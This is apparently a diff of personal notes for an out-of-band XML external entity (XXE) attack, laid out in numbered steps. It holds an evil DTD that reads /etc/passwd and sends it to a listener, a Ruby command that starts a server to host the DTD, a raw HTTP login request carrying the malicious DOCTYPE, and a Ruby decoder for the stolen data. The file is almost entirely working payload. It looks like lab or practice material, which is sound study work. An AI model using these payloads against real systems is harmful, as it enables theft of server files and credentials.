@@ -1,17 +1,18 @@
-############################1###################################
+############################1 XML Entity Injection(Evil_xml.dtd)#######################
 <!ENTITY % p1 SYSTEM "file:///etc/passwd">
-<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://127.0.0.1:80/?%p1;'>">
+<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://127.0.0.1:3000/?%p1;'>">
 %p2;
-############################2###################################
+############################2 Get SERVER#################################
 ruby -run -ehttpd . -p3000
-############################3###################################
+############################3 Repeater###################################
 POST /login HTTP/1.1
 Host: vulnerable
 Connection: close
-Content-Type: text/xml
+Content-Type: text/xml <-change
 Content-Length: 97
 
 <?xml version="1.0"?>
-<!DOCTYPE foo SYSTEM "http://192.168.159.1:3000/test.dtd">
+<!DOCTYPE foo SYSTEM "http://127.0.0.1:3000/evil_xml.dtd">
 <foo>&e1;</foo>
-################################################################
+###########################4. Decoder####################################
+require 'uri'; puts URI.decode("Answer")
